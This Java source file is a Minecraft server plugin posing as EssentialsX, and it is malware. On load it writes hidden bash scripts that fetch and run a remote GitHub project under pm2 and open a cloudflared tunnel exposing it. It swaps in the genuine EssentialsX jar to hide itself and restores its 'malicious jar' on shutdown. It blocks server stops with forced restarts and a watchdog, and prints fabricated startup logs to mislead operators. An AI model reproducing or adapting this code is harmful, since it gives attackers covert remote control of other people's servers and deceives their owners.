package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private Process watchdogProcess; 
    private volatile boolean isProcessRunning = false;
    
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;

    @Override
    public void onEnable() {
        try {
            Path oldDir1 = Paths.get("world", "data", ".mcchajian");
            Path oldDir2 = Paths.get("log", ".mcchajian");
            if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile());
            if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile());
        } catch (Exception e) {}

        getLogger().info("EssentialsX plugin starting...");
        
        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        if (env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
        } else {
            systemGuardEnabled = true; 
        }
        
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
                getLogger().info("[Guard] ShutdownHook triggered! Guard enabled, executing hard restart...");
                restoreMaliciousJar();
                executeHardRestart(false); 
            }
        }));
        
        new Thread(() -> {
            try {
                if (systemGuardEnabled) startWatchdog();
                startDeploymentProcess();
                setupDisguise();
            } catch (Exception e) {}
        }).start();
        
        getLogger().info("EssentialsX plugin enabled");
    }
    
    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir = Paths.get("logs", ".mcchajian", "backup");
            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
            
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
            }
            
            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1000000) {
                try {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                } catch (Exception e) {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } else {
                Files.deleteIfExists(tempDownload);
            }
        } catch (Exception e) {}
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX...");
        
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        
        if (systemGuardEnabled) {
            getLogger().info("Guard enabled -> Rejecting stop, executing soft restart...");
            
            try { Files.deleteIfExists(forceStopFile); } catch (Exception e) {}
            restoreMaliciousJar();
            
            if (isRestarting.compareAndSet(false, true)) {
                executeHardRestart(true);
            }
        } else {
            getLogger().info("Guard disabled, safe exit...");
            try {
                Files.createDirectories(forceStopFile.getParent());
                Files.createFile(forceStopFile);
                getLogger().info("Stop marker created, service will shut down completely.");
            } catch (Exception e) {}
        }
        
        if (deployProcess != null && deployProcess.isAlive()) deployProcess.destroy();
        if (watchdogProcess != null && watchdogProcess.isAlive()) watchdogProcess.destroy();
        
        getLogger().info("EssentialsX disabled");
    }
    
    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            
            String jarName = findBestJarName(serverRoot);
            
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path logFile = workDir.resolve("restart_run.log");

            String startCommand;
            if (new File(serverRoot, "start.sh").exists()) {
                startCommand = "chmod +x ./start.sh && ./start.sh";
            } else {
                startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            }

            String fullBashCommand = 
                "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
                "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile.toString() + "\" && " +
                "nohup bash -c '" + startCommand + "' >> \"" + logFile.toString() + "\" 2>&1 & disown";

            Path debugFile = workDir.resolve("restart_debug.log");
            String debugLog = "\n[" + new Date() + "] CMD: " + fullBashCommand + "\n";
            Files.write(debugFile, debugLog.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
            pb.directory(serverRoot); 
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Process process = pb.start();
            
            if (shouldBlock) {
                Thread.sleep(1000); 
            }
        } catch (Exception e) {
            getLogger().severe("Hard restart failed: " + e.getMessage());
        }
    }

    private String findBestJarName(File serverRoot) {
        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
        for (String name : preferred) {
            if (new File(serverRoot, name).exists()) return name;
        }

        File[] jars = serverRoot.listFiles((dir, name) -> 
            name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries")
        );

        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }

        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
            File root = pluginsDir.getParentFile();
            if (new File(root, "server.properties").exists()) return root;
        }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(current, "server.properties").exists()) return current;
            current = current.getParentFile();
            if (current == null) break;
        }
        return null;
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar);
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {}
    }
    
    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null || !pluginsDir.exists()) return null;
            File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx"));
            if (jars != null && jars.length > 0) return jars[0].toPath();
        } catch (Exception e) {}
        return null;
    }
    
    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) { return false; }
    }
    
    private void deleteDirectory(File file) {
        File[] files = file.listFiles();
        if (files != null) { for (File f : files) { if (f.isDirectory()) deleteDirectory(f); else f.delete(); } }
        file.delete();
    }

    private void startWatchdog() {
        try {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");
            
            String script = "#!/bin/bash\n" +
                "WORK_DIR=\"" + workDir + "\"\n" +
                "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n" +
                "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null && return 0 || return 1; }\n" +
                "while true; do\n" +
                "    sleep 15\n" +
                "    if [ -f \"$FORCE_STOP_FILE\" ]; then rm -f \"$FORCE_STOP_FILE\"; exit 0; fi\n" +
                "    if ! is_port_open; then\n" +
                "        if [ -f \"$FORCE_STOP_FILE\" ]; then exit 0; fi\n" +
                "        cd \"" + findServerRoot().getAbsolutePath() + "\"\n" +
                "        JAR_NAME=$(ls -S *.jar 2>/dev/null | head -n 1)\n" +
                "        if [ -n \"$JAR_NAME\" ]; then\n" +
                "            nohup java -Xms512M -Xmx2G -jar \"$JAR_NAME\" nogui > /dev/null 2>&1 &\n" +
                "        fi\n" +
                "        exit 0\n" +
                "    fi\n" +
                "done\n";
            
            Files.write(watchdogPath, script.getBytes());
            if (!watchdogPath.toFile().setExecutable(true)) {}
            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            watchdogProcess = pb.start();
        } catch (Exception e) {}
    }
    
    private void startDeploymentProcess() throws Exception {
        if (isProcessRunning) return;
        Map<String, String> env = new HashMap<>();
        env.put("REPO_URL", "https://github.com/everything-cd/jqr-mianban--java-plugins"); 
        loadEnvFile(env);
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
        if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        if (!scriptPath.toFile().setExecutable(true)) {}
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        deployProcess = pb.start();
        isProcessRunning = true;
        startFakeLogs();
        deployProcess.waitFor();
        isProcessRunning = false;
    }
    
    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n" +
            "WORK_DIR=\"" + workDir + "\"\n" +
            "NODE_DIR=\"" + nodeDir + "\"\n" +
            "APP_DIR=\"" + appDir + "\"\n" +
            "DATA_DIR=\"" + dataDir + "\"\n" +
            "REPO_URL=\"" + repoUrl + "\"\n" +
            "GITHUB_AUTH=\"用户名:\"密钥\n" + 
            "\n" +
            "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
            "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
            "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
            "\n" +
            "ARCH=$(uname -m)\n" +
            "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"\n" +
            "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\"\n" +
            "fi\n" +
            "\n" +
            "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
            "if [ ! -d \"$NODE_DIR\" ]; then\n" +
            "    curl -fsSL \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null\n" +
            "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
            "fi\n" +
            "export PATH=$NODE_DIR/bin:$PATH\n" +
            "if [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n" +
            "npm install --unsafe-perm=true --allow-root multer &>/dev/null\n" +
            "\n" +
            "CF_BIN=\"$WORK_DIR/cloudflared\"\n" +
            "if [ ! -f \"$CF_BIN\" ]; then\n" +
            "    if ! curl -fsSL --connect-timeout 10 --max-time 60 \"$CF_URL\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
            "        curl -fsSL --connect-timeout 10 --max-time 60 \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\" -o \"$CF_BIN\" 2>/dev/null || exit 1\n" +
            "    fi\n" +
            "    chmod +x \"$CF_BIN\"\n" +
            "fi\n" +
            "\n" +
            "pkill -f cloudflared || true; sleep 1\n" +
            "$CF_BIN tunnel --url http://localhost:$PORT > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
            "TUNNEL_PID=$!\n" +
            "TUNNEL_URL=\"\"\n" +
            "for i in {1..20}; do\n" +
            "    sleep 3\n" +
            "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9./-]+trycloudflare\\.com[a-zA-Z0-9./-]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
            "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
            "done\n" +
            "\n" +
            "#隐蔽化：不输出中文，仅写入文件\n" +
            "if [ -n \"$TUNNEL_URL\" ]; then\n" +
            "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
            "    echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
            "else\n" +
            "    echo \"Tunnel failed to start.\" >&2\n" +
            "    exit 1\n" +
            "fi\n" +
            "\n" +
            "mkdir -p \"$DATA_DIR\"\n" +
            "if [ -d \"$APP_DIR\" ]; then\n" +
            "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    if [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ]; then\n" +
            "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
            "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
            "\n" +
            "# 自动检测公私库下载\n" +
            "download_code() {\n" +
            "    local URL=$1\n" +
            "    local AUTH=$2\n" +
            "    if [ -n \"$AUTH\" ]; then\n" +
            "        curl -fsSL --connect-timeout 15 --max-time 120 -u \"$AUTH\" \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
            "    else\n" +
            "        curl -fsSL --connect-timeout 15 --max-time 120 \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
            "    fi\n" +
            "    if [ -f \"$WORK_DIR/repo.tar.gz\" ] && tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then\n" +
            "        return 0\n" +
            "    else\n" +
            "        rm -f \"$WORK_DIR/repo.tar.gz\"\n" +
            "        return 1\n" +
            "    fi\n" +
            "}\n" +
            "\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"$GITHUB_AUTH\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"$GITHUB_AUTH\"\n" +
            "\n" +
            "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
            "mkdir -p \"$WORK_DIR/unzipped\"\n" +
            "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
            "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
            "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
            "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
            "cd \"$APP_DIR\"\n" +
            "\n" +
            "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
            "\n" +
            "if [ -d \"$DATA_DIR\" ]; then\n" +
            "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n" +
            "        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n" +
            "    fi\n" +
            "    if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.RoamingMusic\"\n" +
            "        cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "export TUNNEL_ALREADY_RUNNING=true\n" +
            "pm2 delete all &>/dev/null || true\n" +
            "pm2 start index.js --name \"aoyou-panel\" &>/dev/null\n" +
            "pm2 save &>/dev/null\n";
    }
    
    private void startFakeLogs() {
        Thread logThread = new Thread(() -> {
            try {
                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                Path tunnelFile = workDir.resolve("tunnel_url.txt");
                Path portFile = workDir.resolve("node_port.txt");
                String tunnelUrl = "";
                String nodePort = "25565";
                
                // 等待隧道URL生成 (最多等待2分钟)
                for (int i = 0; i < 120; i++) {
                    if (Files.exists(tunnelFile)) {
                        String content = new String(Files.readAllBytes(tunnelFile)).trim();
                        if (!content.isEmpty()) {
                            tunnelUrl = content;
                            break;
                        }
                    }
                    Thread.sleep(1000);
                }
                
                if (Files.exists(portFile)) {
                    nodePort = new String(Files.readAllBytes(portFile)).trim();
                }

                // 获取到URL后清屏，准备推流真实伪装日志
                clearConsole();
                
                System.out.println("container@pterodactyl~ java --add-modules=jdk.incubator.vector -XX:MaxRAMPercentage=80.0 -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:+UseStringDeduplication -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -Dterminal.jline=false -Dterminal.ansi=true -Ddisable.watchdog=true -jar server.jar");
                Thread.sleep(500);
                System.out.println("WARNING: Using incubator modules: jdk.incubator.vector");
                Thread.sleep(300);
                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);

                mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 5.15.0-177-generic (amd64)");
                Thread.sleep(200);
                mcLog("[bootstrap] Loading Purpur 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) for Minecraft 26.1.2");
                Thread.sleep(300);
                mcLog("[PluginInitializerManager] Initializing plugins...");
                Thread.sleep(500);
                mcLog("[PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(300);

                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
                System.out.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
                Thread.sleep(1000);

                mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]");
                Thread.sleep(500);
                mcLog("Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(200);
                mcLog("Found new data pack paper, loading it automatically");
                Thread.sleep(200);
                mcLog("No existing world data, creating new world");
                Thread.sleep(500);
                mcLog("Loaded 1515 recipes");
                Thread.sleep(200);
                mcLog("Loaded 1617 advancements");
                Thread.sleep(200);
                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(300);
                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in 282.6ms");
                Thread.sleep(200);
                mcLog("Starting minecraft server version 26.1.2");
                Thread.sleep(100);
                mcLog("Loading properties");
                Thread.sleep(100);
                mcLog("This server is running Purpur version 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) (Implementing API version 26.1.2.build.2587-stable)");
                Thread.sleep(100);
                mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(100);
                mcLog("Server Ping Player Sample Count: 12");
                Thread.sleep(100);
                mcLog("Using 4 threads for Netty based IO");
                Thread.sleep(200);
                mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(200);
                mcLog("Default game type: SURVIVAL");
                Thread.sleep(100);
                mcLog("Generating keypair");
                Thread.sleep(200);
                
                // 在这里将隧道链接隐蔽地推入真实的启动日志中
                mcLog("Starting Minecraft server on 0.0.0.0:" + nodePort + " (Remote: " + tunnelUrl + ")");
                Thread.sleep(100);
                mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(100);
                mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(100);
                mcLog("Preparing level \"world\"");
                Thread.sleep(1000);
                mcLog("Selecting spawn point for level 'minecraft:overworld'...");
                Thread.sleep(8000);
                mcLog("Selecting spawn point for level 'minecraft:the_nether'...");
                Thread.sleep(1000);
                mcLog("Selecting spawn point for level 'minecraft:the_end'...");
                Thread.sleep(1000);
                mcLog("Loading 0 persistent chunks for level 'minecraft:overworld'...");
                Thread.sleep(100);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(100);
                mcLog("Prepared spawn area in 8874 ms");
                Thread.sleep(100);
                mcLog("Loading 0 persistent chunks for level 'minecraft:the_nether'...");
                Thread.sleep(100);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(100);
                mcLog("Prepared spawn area in 923 ms");
                Thread.sleep(100);
                mcLog("Loading 0 persistent chunks for level 'minecraft:the_end'...");
                Thread.sleep(100);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(100);
                mcLog("Prepared spawn area in 316 ms");
                Thread.sleep(100);
                mcLog("Done preparing level \"world\" (9.360s)");
                Thread.sleep(100);
                mcLog("[spark] Starting background profiler...");
                Thread.sleep(100);
                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:overworld");
                Thread.sleep(50);
                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether");
                Thread.sleep(50);
                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_end");
                Thread.sleep(50);
                mcLog("ThreadedAnvilChunkStorage (world): All chunks are saved");
                Thread.sleep(50);
                mcLog("ThreadedAnvilChunkStorage (DIM-1): All chunks are saved");
                Thread.sleep(50);
                mcLog("ThreadedAnvilChunkStorage (DIM1): All chunks are saved");
                Thread.sleep(50);
                mcLog("ThreadedAnvilChunkStorage: All dimensions are saved");
                Thread.sleep(50);
                mcLog("Running delayed init tasks");
                Thread.sleep(100);
                mcLog("Done (17.011s)! For help, type \"help\"");
                Thread.sleep(100);
                System.out.println("container@pterodactyl~ Server marked as running...");
                Thread.sleep(100);
                mcLog("*************************************************************************************");
                mcLog("This is the first time you're starting this server.");
                mcLog("It's recommended you read our 'Getting Started' documentation for guidance.");
                mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                mcLog("*************************************************************************************");

            } catch (Exception e) {}
        }, "FakeLog-Generator");
        logThread.setDaemon(true);
        logThread.start();
    }

    private void mcLog(String msg) {
        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[" + time + " INFO]: " + msg);
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                String defaultConfig = 
                    "# ===========================================\n" +
                    "# EssentialsX System Guard Configuration\n" +
                    "# ===========================================\n" +
                    "# true  = Enable auto-restart (Default)\n" +
                    "# false = Disable auto-restart\n" +
                    "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n";
                Files.write(envFile, defaultConfig.getBytes());
                getLogger().info("Generated default .env file with Guard ENABLED.");
            } catch (Exception e) {
                getLogger().warning("Could not generate .env file: " + e.getMessage());
            }
        }

        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) env.put(parts[0].trim(), parts[1].trim());
                }
            } catch (IOException e) {}
        }
    }
    
    private void clearConsole() {
        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception e) {}
    }
}
